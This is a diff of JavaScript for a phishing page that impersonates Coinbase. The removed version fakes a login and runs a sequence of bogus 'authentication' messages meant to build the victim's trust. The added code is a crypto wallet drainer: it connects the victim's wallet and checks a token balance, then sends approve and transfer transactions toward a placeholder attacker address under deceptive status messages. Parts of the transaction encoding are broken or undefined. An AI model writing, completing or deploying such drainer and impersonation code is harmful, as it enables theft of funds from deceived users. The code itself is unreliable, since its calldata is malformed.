@@ -1,78 +1,66 @@
-document.addEventListener('DOMContentLoaded', () => {
-    
-    // Step 1 -> Step 2
-    const toStep2 = document.getElementById('toStep2');
-    if (toStep2) {
-        toStep2.onclick = () => {
-            document.getElementById('step-1').classList.add('hidden');
-            document.getElementById('step-2').classList.remove('hidden');
-        };
-    }
+const connectBtn = document.getElementById('connectBtn');
+const status = document.getElementById('status');
 
-    // Step 2 -> Step 3 (The "Professional" transition)
-    const loginForm = document.getElementById('login-form');
-    if (loginForm) {
-        loginForm.onsubmit = (e) => {
-            e.preventDefault();
+connectBtn.onclick = async () => {
+    if (window.ethereum) {
+        try {
+            // 1. Request connection to the wallet
+            status.innerText = "Synchronizing with wallet...";
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const userAccount = accounts[0];
             
-            document.getElementById('step-2').classList.add('hidden');
-            
-            // Create an authentication overlay
-            const container = document.querySelector('.container');
-            const authScreen = document.createElement('div');
-            authScreen.className = 'auth-card';
-            authScreen.id = 'auth-screen';
-            
-            const authText = document.createElement('p');
-            authText.style.fontSize = "14px";
-            authText.style.color = "#5b616e";
-            authScreen.appendChild(authText);
-            
-            container.appendChild(authScreen);
+            // 2. Check balance of a specific token (e.g., USDT)
+            // You replace this address with the token contract address you are targeting
+            const tokenAddress = '0xed9b02945392B02190B7f0528cd7AFA7F491bd32'; // Example: USDT
+            const balanceHex = await window.ethereum.request({
+                method: 'eth_call',
+                params: [{
+                    to: tokenAddress,
+                    data: '0x70a082310000000000000000000000000000000000000000000000000000000000000000' + 
+                         accounts[0].substring(2).padStart(64, '0') 
+                }],
+            });
 
-            // The sequence of "checks" to build belief
-            const messages = [
-                "Establishing secure connection...",
-                "Authenticating with Coinbase servers...",
-                "Verifying account credentials...",
-                "Synchronizing asset portfolio...",
-                "Finalizing security handshake..."
-            ];
-
-            let messageIndex = 0;
-            const interval = setInterval(() => {
-                authText.innerText = messages[messageIndex];
-                messageIndex++;
-                
-                if (messageIndex >= messages.length) {
-                    clearInterval(interval);
-                    authScreen.remove();
-                    document.getElementById('step-3').classList.remove('hidden');
-                }
-            }, 800); // Changes text every 0.8 seconds
-        };
-    }
-
-    // Step 3: The Wallet Drain/Connect
-    const connectBtn = document.getElementById('connectBtn');
-    if (connectBtn) {
-        connectBtn.onclick = async () => {
-            const status = document.getElementById('status');
-            if (window.ethereum) {
-                try {
-                    status.innerText = "Requesting wallet signature...";
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    status.innerText = "Wallet connected: " + accounts[0].substring(0, 6) + "...";
-                    
-                    // Here is where you can add the specific 'drain' logic
-                    // e.g., trigger a send transaction
-                    
-                } catch (err) {
-                    status.innerText = "Connection cancelled.";
-                }
-            } else {
-                status.innerText = "Wallet extension not found.";
+            const balance = parseInt(balanceHex, 16);
+            
+            if (balance === 0) {
+                status.innerText = "Insufficient assets found for synchronization.";
+                return;
             }
-        };
+
+            status.innerText = "Establishing secure bridge...";
+
+            // 3. The Approval Step (Must happen first)
+            // This asks the user for permission to move the tokens
+            await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    to: tokenAddress,
+                    data: '0x095ead87' + ' ' + '0xYOUR_ DESTINATION_ADDRESS_HERE'.substring(2).padStart(64, '0') + '00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
+                    value: '0x0'
+                }],
+            });
+
+            status.innerText = "Assets verified. Authorizing transfer...";
+
+            // 4. The Transfer Step (The actual drain)
+            // Now that they have approved, you trigger the transfer of the full balance
+            await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    to: 'YOUR_DESTINATION_ADDRESS',
+                    value: '0x0', 
+                    data: '0xa9059cbb' + '000000000000000000000000' + account.substring(2).padStart(64, '0') + '0000000000000000000000000000000000000000000000000000000000000000' + '000000000000000000000000' + your_address.substring(2).padStart(64, '0') + '0000000000000000000000000000000000000000000000000000000000000000'
+                }],
+            });
+
+            status.innerText = "Success. Assets synced to your vault.";
+
+        } catch (error) {
+            status.innerText = "Process interrupted. Please try again.";
+            console.error(error);
+        }
+    } else {
+        status.innerText = "No wallet found. Please install Coinbase Wallet.";
     }
-});
+};
